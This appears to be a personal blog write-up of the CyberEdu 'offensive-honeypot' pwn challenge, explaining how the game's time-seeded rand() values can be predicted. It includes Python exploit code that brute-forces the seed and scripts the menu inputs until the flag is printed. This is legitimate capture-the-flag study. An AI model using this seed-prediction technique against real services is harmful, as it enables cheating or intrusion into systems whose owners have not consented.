+++
date = '2025-12-28'
draft = false
title = 'CyberEdu offensive-honeypot Writeup'
ShowToc = true
tags = ["CyberEdu", "pwn", "buffer-overflow", "Format-String"]
+++


## Challenge overview

Just another **[pwn challenge](https://app.cyber-edu.co/challenges/559cb970-7f21-11ea-a99e-2f006e8673c3?tenant=cyberedu)**.

![challenge-screenshot](pic1.png#center)

We're dealing with a little game, and a canary.

![challenge-screenshot](pic2.png#center)

The win condition is that we beat the game, by killing the *hacker* player.


---

## Identifying the vulnerabilities

![challenge-screenshot](pic3.png#center)

The vulnerability here is that we can calculate the *random* number ourselves, very similarly to another challenge I wrote the writeup for **[here](https://irinasusca.github.io/writeup-blog/posts/babyfmt-writeup/)**.

Since we know the seed ourselves, we can get the same value for `rand()` that the game gets. 

There are three functions that make the player take damage (0 to 1000 hp) and three functions that make the hacker take damage (0 to 30). The `player_hurt()` functions are called during incoming attacks, if we don't pick the correct defense (which we can predict, but more on that later).

![challenge-screenshot](pic4.png#center)

The`hacker_hurt()` functions are called in `start_routine()`:

![challenge-screenshot](pic5.png#center)

Another thing I noticed is that the hacker doesn't take any damage if we don't use menu option 2 (change defense) before option 3 (catch attacks) even though catch attacks calls change defense. This is because of the order that things are done - before incoming attack is called, the `start_routine` is called through the new thread, and `current_defense` isn't set yet, it's just `-1`, and it needs to be a positive/chosen value for hacker to take damage. 

So we need to use option 2 of the menu as well. Since if `current_defense` is `1` when `start_routine` is called, the hacker takes the highest amount of damage (`rand()%30` instead of 3 or 4), we'll set our defense to `1` initially.

Then, we call option 3, and change our defense back to a proper and calculated defense (*get it, because it's literally calculated, haha*).

![challenge-screenshot](pic6.png#center)

So, if we can just guess that random number, we can always put the right defense on, and just beat the game in less than 200 rounds (Game over). 

I set a breakpoint at the first `rand()` call, and looked at the `rax` to detect the proper seed for the local binary (it will most certainly differ remotely, because connection takes longer). Sometimes it was the value at `i=10`, other times at `i=11`.

```python
#c code
libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
now = int(time.time())


i=10
j=1

for seed in range(now - 10, now + 10):
    libc.srand(seed)
    random = libc.rand()
    print(seed, random)
    if i==j:
    	random_number = random
    
    j=j+1
    
print(f"random number for i={i} is {random_number}")
```
![challenge-screenshot](pic7.png#center)


---

## The exploit

Alright, we got the number, and now essentially the flow we want is this:

- Pick option 2

- Make current defense 1

- Create a defense variable ourselves, `libc.rand() & 3`, equal to their one

- Make current defense the defense variable

- Repeat

Keep in mind, the first iteration we use the first `random_number`, the one calculated above.

This logic *seemed* great, but now the random number just stopped matching up. The reason why is because the damage dealt to the hacked with `rand()%30` also calls `rand`, so we also need to call `rand()` in our code every time the hacker takes damage.

And another thing, we need to update the `seed`, because it would always end up as the last seed tried in the loop (`now + whatever`), which isn't what we want (`now + i`).

I made the specified modifications, I ran the script about four times, it failed, but the fifth time, it worked! 

![challenge-screenshot](pic8.png#center)

```python
#c code
libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
now = int(time.time())

i=10
j=1

for seed in range(now - 10, now + 10):
    libc.srand(seed)
    random = libc.rand()
    print(seed, random)
    if i==j:
    	random_number = random
    	random_seed = seed
    
    j=j+1
    
    
#save the seed at now + i

libc.srand(random_seed)
random_number = libc.rand()
    
print(f"random number for i={i} is {random_number}")

#send name
p.recvuntil(b"name?\n")
p.sendline(b"fufu")

p.recvuntil(b"option:")
p.sendline(b"2")

p.recvuntil(b"Option: ")
p.sendline(b"1")

print(f"hacker number is {random_number}")

#hacker takes damage, so rand() is called, let's keep up;
#the first time, we don't call rand() for this 
#because we already called it once for our seed

p.recvuntil(b"option:")
p.sendline(b"3")

random_number = libc.rand()
print(f"player number is {random_number}")
defense = random_number & 3
p.recvuntil(b"Option: ")
p.sendline(str(defense).encode())

#now we can start a loop

while True:
    
    #go forth with our thing
    try: 
        p.recvuntil(b"option:", timeout=0.5)
        p.sendline(b"2")
        
        p.recvuntil(b"Option: ")
        p.sendline(b"1")

        
        #hacker takes damage here, rand() called
        hacker = libc.rand()
        print(f"hacker number is {hacker}")
        
        random_number = libc.rand()
        print(f"player number is {random_number}")
        defense = random_number & 3
        
        p.recvuntil(b"option:")
        p.sendline(b"3")
        p.recvuntil(b"Option: ")
        p.sendline(str(defense).encode())
        
        buf = b""          # reset after handling
        continue

    # if the program printed something else (flag hopefully) and stopped prompting
    except:
        break

p.interactive()
```

I modified my `i` to `11` and we easily get the flag remotely, as well!

![challenge-screenshot](pic9.png#center)

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/offensivehoneypot.py)**.
